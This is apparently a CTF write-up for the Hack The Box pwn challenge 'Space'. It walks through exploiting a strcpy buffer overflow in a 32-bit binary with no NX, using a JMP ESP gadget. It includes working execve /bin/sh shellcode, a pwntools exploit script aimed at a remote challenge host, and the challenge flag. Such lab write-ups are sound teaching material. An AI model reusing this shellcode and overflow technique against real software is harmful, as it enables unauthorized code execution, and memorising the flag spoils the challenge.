---
title: "Space – HTB Challenge"
date: 2025-09-12T12:00:00Z
tags: ["pwn", "shellcode", "buffer overflow", "i386"]
categories: ["HTB"]
cover: "images/CTFs_images/hackthebox.png"
---

## Challenge Description
```

roaming in a small space

````

This challenge is a classic **shellcode injection** on a 32-bit binary with minimal protections. The main constraint is the **very limited space available** for our attack.

---

### Initial Recon

Checking the file:

```sh
$ file space
space: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
$ checksec space
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
````

* **32-bit ELF**
* **No NX / Stack Executable**
* **Not PIE**
* **RWX segment available**
* **No stack canary**

This makes it suitable for a **direct shellcode injection**.

---

### Function Analysis

Listing functions:

```c
0x08049192  _       ; contains JMP ESP
0x080491a4  vuln
0x080491cf  main
...
```

Disassembly of `_`:

```asm
08049192 <_>:
   push   ebp
   mov    ebp,esp
   call   0x8049243
   add    eax,0x212a
   jmp    esp
   nop
   pop    ebp
   ret
```

Key observation:

* Contains a **`JMP ESP`** instruction → perfect for redirecting execution to our shellcode.
* Rare in binaries, but extremely useful when NX is disabled.

---

### Vulnerable Function Analysis

`main` reads up to **0x1f (31) bytes** into `[ebp-0x27]` and then calls `vuln`:

```asm
080491cf <main>:
...
0804922c call 0x80491a4 <vuln>
...
```

`vuln`:

```asm
080491a4 <vuln>:
   push ebp
   mov ebp, esp
   sub esp,0x14
   call 0x8049243
   add eax,0x2114
   push DWORD PTR [ebp+0x8]  ; user input
   lea edx,[ebp-0xe]          ; dest buffer
   push edx
   call strcpy                ; unsafe copy!
   ...
```

Analysis:

* **Destination buffer:** `[ebp-0xe]` → 14 bytes
* **Source:** `[ebp+0x8]` → user input
* **Overflow:** `strcpy` copies until `\x00` → **classic buffer overflow**

Using `cyclic` to find the offset to EIP:

```sh
pwndbg> cyclic -l aafa
Found at offset 18
```

* Only **18 bytes** to reach EIP → small, but feasible with shellcode injection.

---

### Stack Layout & Exploit Strategy

Due to the limited space before EIP, we perform a **two-stage shellcode injection**:

1. **Stub:** Adjust stack pointer (`sub esp, 0x15`) to create safe execution space.
2. **Jump to shellcode:** `jmp esp` from `_` instruction.
3. **Main shellcode:** Execute `/bin/sh`.

---

### Shellcode

**Assembly:**

```asm
section .text
    global _start

_start:
    xor ecx, ecx
    mul ecx                ; zero EAX
    sub esp, 0x15          ; adjust stack
    jmp esp                ; jump to shellcode

    push eax
    push 0x68732f2f        ; "//sh"
    push 0x6e69622f        ; "/bin"
    mov ebx, esp
    mov al, 11
    int 0x80
```

**Hex representation (Python payload):**

```python
\x31\xc9\xf7\xe1\x83\xec\x15\xff\xe4\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

**Explanation:**

* `sub esp, 0x15` → creates safe space on stack to avoid corruption.
* `jmp esp` → jumps to ESP, which points to shellcode after stub.
* Payload layout:

```
[Shellcode last part] + [EIP = JMP ESP] + [Stub: sub esp, jmp esp]
```

* Stack grows downwards - this arrangement ensures proper execution.

---

### Exploit Script

```python
from pwn import *

io = remote("94.237.49.23", 44964)
# io = process("./space")

jmp_esp = p32(0x0804919f)

shellcode_first = b"\x31\xc9\xf7\xe1\x83\xec\x15\xff\xe4"
shellcode_last  = b"a" + b"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"  # 18 bytes

payload = shellcode_last + jmp_esp + shellcode_first

io.sendafter(b"> ", payload)
io.interactive()
```

---

### Flag Retrieved

{{< figure src="/images/posts_images/htb/challenge/space/image.png">}}

```
HTB{sh3llc0de_1n_7h3_5p4c3}
```

---

### Summary

* **Vulnerability:** `strcpy` buffer overflow in 32-bit ELF with no NX.
* **Exploit:** Two-stage shellcode injection due to very limited space (18 bytes to EIP).

If you notice any inaccuracies or mistakes in this writeup, please feel free to contact me. I’d be happy to clarify or correct any information.
